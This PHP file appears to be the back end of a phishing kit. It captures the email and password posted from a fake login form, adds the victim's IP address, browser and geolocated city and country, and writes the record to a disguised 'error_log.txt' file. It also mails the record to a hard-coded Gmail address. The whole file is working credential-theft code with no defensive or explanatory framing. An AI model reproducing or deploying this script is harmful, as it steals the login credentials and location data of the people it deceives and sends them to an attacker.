<?php


$browser = $_SERVER['HTTP_USER_AGENT'];

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

$geoplugin->locate();
function get_client_ip ()
{
    if (!isset ($_SERVER['REMOTE_ADDR'])) {
        return NULL;
    }

    $proxy_header = "HTTP_X_FORWARDED_FOR";

    $trusted_proxies = array ("94.74.81.174");

    if (in_array ($_SERVER['REMOTE_ADDR'], $trusted_proxies)) {

        if (array_key_exists ($proxy_header, $_SERVER)) {

            $client_ip = trim (end (explode (",", $_SERVER[$proxy_header])));

            if (filter_var ($client_ip, FILTER_VALIDATE_IP)) {
                return $client_ip;
            } else {

            }
        }
    }

    return $_SERVER['REMOTE_ADDR'];
}

$ip = get_client_ip ();


@$message .= "---------------|V0y493|---------------\n";
$message .= "USER AGENT: ".$browser."\n\n"; 
$message .= "Email: " . $_POST['login'] . "\n"; 
$message .= "Password: " . $_POST['passwd'] . "\n\n"; 
$message .= "IP : " .$ip. "\n"; 
$message .= "--------------------------------------------\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "---------------------------------------------\n";


$to = "bdshiprnan@gmail.com"; 
$fp = fopen("../error_log.txt","a");
fputs($fp,$message);
@$hi = mail($to,"LOG for " . $_POST['login'] . " |  $ip | ".$geoplugin->countryName , $message);





?>
